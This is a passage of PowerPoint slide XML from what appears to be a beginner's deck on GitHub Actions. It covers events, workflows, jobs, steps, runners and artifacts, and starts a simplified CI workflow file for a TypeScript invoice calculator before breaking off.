            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Same invoice calculator in both languages, so the pipelines can be compared side by side.</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GitHub Actions in 5 minutes</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Automation defined as YAML in your repository, executed by GitHub on every event</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Concept Event"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1645920"/>
            <a:ext cx="2514600" cy="274320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5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1440180" y="1901952"/>
            <a:ext cx="731520" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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6" name="Icon 6" descr="Zap"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1615745" y="2077517"/>
            <a:ext cx="380390" cy="380390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2724912"/>
            <a:ext cx="2514600" cy="41148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900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Event</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3200400"/>
            <a:ext cx="2148840" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push, pull_request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>schedule (cron)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>workflow_dispatch (button)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="F5B400"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>workflow_call (reuse)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="9" name="Connector 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3099816" y="3017520"/>
            <a:ext cx="265176" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Concept Workflow"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="1645920"/>
            <a:ext cx="2514600" cy="274320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1" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4293108" y="1901952"/>
            <a:ext cx="731520" cy="731520"/>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2" name="Icon 12" descr="FileCode"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4468673" y="2077517"/>
            <a:ext cx="380390" cy="380390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="2724912"/>
            <a:ext cx="2514600" cy="41148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900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Workflow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3630168" y="3200400"/>
            <a:ext cx="2148840" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="6E3CBE"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lives in .github/workflows</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="6E3CBE"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One file per pipeline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="6E3CBE"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reviewed in PRs like code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Connector 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5952744" y="3017520"/>
            <a:ext cx="265176" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Concept Jobs"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="1645920"/>
            <a:ext cx="2514600" cy="274320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7" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7146036" y="1901952"/>
            <a:ext cx="731520" cy="731520"/>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8" name="Icon 18" descr="Server"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7321601" y="2077517"/>
            <a:ext cx="380390" cy="380390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6254496" y="2724912"/>
            <a:ext cx="2514600" cy="41148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900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jobs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483096" y="3200400"/>
            <a:ext cx="2148840" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0A9BCD"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Run in parallel by default</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0A9BCD"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fresh runner VM per job</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="0A9BCD"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Order with needs:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="Connector 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8805672" y="3017520"/>
            <a:ext cx="265176" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="8C8C8C"/>
            </a:solidFill>
            <a:round/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Concept Steps"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9107424" y="1645920"/>
            <a:ext cx="2514600" cy="274320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3" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9998964" y="1901952"/>
            <a:ext cx="731520" cy="731520"/>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4" name="Icon 24" descr="ListChecks"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10174529" y="2077517"/>
            <a:ext cx="380390" cy="380390"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9107424" y="2724912"/>
            <a:ext cx="2514600" cy="41148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900" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Steps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9336024" y="3200400"/>
            <a:ext cx="2148840" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="26AF72"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>run: a shell command</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="26AF72"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>uses: a reusable action</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="182880" indent="-182880" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="26AF72"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Share data via artifacts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Key facts"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4709160"/>
            <a:ext cx="11091672" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="282828"/>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8" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4846320"/>
            <a:ext cx="3474720" cy="82296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400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Runners</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub-hosted (ubuntu-latest) or self-hosted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4480560" y="4846320"/>
            <a:ext cx="3474720" cy="82296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400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Marketplace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Reusable actions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: checkout, setup-node, upload-artifact...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="4846320"/>
            <a:ext cx="3474720" cy="82296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400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Artifacts &amp; cache</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pass files between jobs, speed up installs</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Anatomy of a workflow file</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ts-ci.yml, simplified: one job shown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="5A5A5A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, the real file has seven</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="6309360" cy="429768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name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: TS CI</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on</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pull_request</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paths</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"ts-app/**"</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push</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branches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: [main]</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workflow_call</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permissions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: {}</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concurrency</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group</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: ts-ci-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC861"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>${{ github.ref }}</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cancel-in-progress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: true</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jobs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lint</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runs-on</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: ubuntu-latest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permissions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contents</a:t>
            </a:r>
            <a:r>
